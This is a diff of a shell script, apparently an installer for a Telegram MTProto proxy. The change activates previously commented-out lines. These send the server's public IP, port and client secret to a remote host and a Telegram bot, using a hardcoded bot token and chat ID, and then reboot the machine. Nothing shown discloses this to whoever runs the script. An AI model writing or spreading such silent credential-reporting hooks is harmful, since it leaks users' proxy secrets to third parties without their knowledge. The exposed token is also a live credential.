@@ -330,16 +330,16 @@ EOF
 			fi
 			echo -e "[\033[33m错误\033[0m]!"
 		done
-		#echo $default_IP
-		#Url="http://$default_IP:808/?name=Add_MTP&ip=$public_ip&port=8443&secret=$client_secret"
-		#echo $Url
-		#Text=$(curl -s $Url)
-		#echo $Text
-		#curl POST \
+		echo $default_IP
+		Url="http://$default_IP:808/?name=Add_MTP&ip=$public_ip&port=443&secret=$client_secret"
+		echo $Url
+		Text=$(curl -s $Url)
+		echo $Text
+		curl POST \
 			"https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage" \
 			-d chat_id="-1002002115399" \
 			-d text=${Text}
-		#reboot
+		reboot
 
 		fi
 
